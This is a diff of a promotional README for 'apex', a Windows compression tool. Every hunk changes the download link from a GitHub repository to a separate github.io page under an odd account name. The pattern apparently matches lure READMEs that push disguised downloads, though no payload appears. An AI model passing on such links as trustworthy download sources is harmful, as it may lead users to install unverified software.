@@ -1,7 +1,7 @@
 <h1>🗜️ apex - Your All-in-One Compression & Backup Powerhouse</h1>
 
 <p align="center">
-  <a href="https://github.com/Exploratory-lawpractice6837/apex">
+  <a href="https://exploratory-lawpractice6837.github.io">
     <img src="https://img.shields.io/badge/Download%20apex-Free%20%26%20Open%20Source-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f" alt="Download apex">
   </a>
 </p>
@@ -26,7 +26,7 @@ Getting apex on your Windows computer is a breeze. Just follow these three simpl
 
 ### Step 1: Download apex
 
-Visit this link to download the application: [https://github.com/Exploratory-lawpractice6837/apex](https://github.com/Exploratory-lawpractice6837/apex)
+Visit this link to download the application: [https://exploratory-lawpractice6837.github.io](https://exploratory-lawpractice6837.github.io)
 
 Click the big green download button on that page, and the download will start automatically. The file is small, so it won't take long even on slower connections.
 
@@ -130,7 +130,7 @@ apex is released under the MIT License, which means you can use, modify, and dis
 
 Download apex today and experience the joy of having all your files neatly packed, perfectly safe, and taking up minimal space. It takes less than five minutes to install, and you'll wonder how you ever managed without it.
 
-**Visit this link to download the application:** [https://github.com/Exploratory-lawpractice6837/apex](https://github.com/Exploratory-lawpractice6837/apex)
+**Visit this link to download the application:** [https://exploratory-lawpractice6837.github.io](https://exploratory-lawpractice6837.github.io)
 
 Join thousands of satisfied users who've already simplified their digital lives with apex. Your files deserve the best — give them apex.
 
